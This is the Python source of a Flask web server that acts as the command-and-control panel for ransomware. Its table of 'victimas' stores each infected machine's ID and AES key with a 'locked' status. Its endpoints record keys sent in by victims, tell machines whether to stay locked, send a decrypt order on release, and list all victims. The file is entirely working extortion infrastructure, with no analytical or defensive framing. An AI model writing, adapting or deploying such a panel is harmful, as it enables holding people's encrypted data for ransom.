from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)
DB_NAME = "c2_panel.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victimas 
                      (id TEXT PRIMARY KEY, aes_key TEXT, status TEXT)''')
    conn.commit()
    conn.close()

@app.route('/api/checkin', methods=['POST'])
def checkin():
    v_id = request.form.get('id')
    key_hex = request.form.get('key')
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO victimas (id, aes_key, status) VALUES (?, ?, ?)", (v_id, key_hex, "locked"))
    conn.commit()
    conn.close()
    return jsonify({"status": "reported"})

@app.route('/api/instruction/<v_id>', methods=['GET'])
def get_instruction(v_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT status FROM victimas WHERE id = ?", (v_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else "locked"

@app.route('/api/release/<v_id>', methods=['GET'])
def release_victim(v_id):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("UPDATE victimas SET status = 'decrypt' WHERE id = ?", (v_id,))
    conn.commit()
    conn.close()
    return f"Orden de descifrado enviada para {v_id}"

@app.route('/panel')
def panel():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM victimas")
    rows = cursor.fetchall()
    conn.close()
    return jsonify(rows)

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=3030)